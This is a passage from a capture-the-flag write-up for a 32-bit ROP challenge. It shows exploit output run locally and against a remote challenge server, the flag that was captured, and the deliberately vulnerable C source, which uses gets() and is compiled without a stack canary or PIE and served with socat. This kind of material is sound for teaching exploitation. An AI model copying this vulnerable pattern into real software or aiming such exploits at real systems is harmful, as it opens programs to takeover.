[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2370
=========================
what the process returned
[*] Process '/home/reisraff/workdir/challs/port-65144/port-65144' stopped with exit code 0 (pid 2370)
Enter your buffer: gotcha func1
gotcha func2
FLAG TEST
```

Now we have to run remotely, since the binary name is port-65144, lets try this port:

```python
# ...
p = pwn.remote('173.230.139.237', '65144')
# ...
```

output:
```
reisraff@3dbbde46a935:~/workdir/challs/port-65144$ python3 exploit.py
[*] '/home/reisraff/workdir/challs/port-65144/port-65144'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/reisraff/workdir/challs/port-65144/port-65144': pid 2375
[+] Opening connection to 173.230.139.237 on port 65144: Done
=========================
what the process returned
Enter your buffer: gotcha func1
gotcha func2
reisraff{D47a_3xecu710n_Pr3ven71on_owned}

```

The source code of this challenge is:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/mman.h>

bool flag1 = false;
bool flag2 = false;

void func1(int num1, int num2) {
    if (156 == num1 && 300 == num2) {
        flag1 = true;
        puts("gotcha func1");
    }
}

void func2(int num1, int num2, int num3) {
    if (flag1 && !num1 && 13 == num2 && (num1 + num2) == num3) {
        flag2 = true;
        puts("gotcha func2");
    }
}

void flag(int num1) {
    int fd = open("/code/ROP-me/flag.txt", O_RDONLY);
    int len = lseek(fd, 0, SEEK_END);
    void *data = mmap(0, len, PROT_READ, MAP_PRIVATE, fd, 0);

    if (flag1 && flag2 && (num1 - flag1) == flag2) {
        printf("%s", data);
        exit(0);
    }
}

void vuln() {
    char buffer[160];

    printf("Enter your buffer: ");
    gets(buffer);
}

int main() {
    vuln();

    puts("not this time");

    return 1;
}

```

And I compile like:

```bash
gcc -o program program.c -m32 -no-pie -w -fno-stack-protector

# Then I strip
strip program

# And then I set it up with socat to run in the por 65144
socat TCP4-LISTEN:65144,reuseaddr,fork EXEC:./program &
```
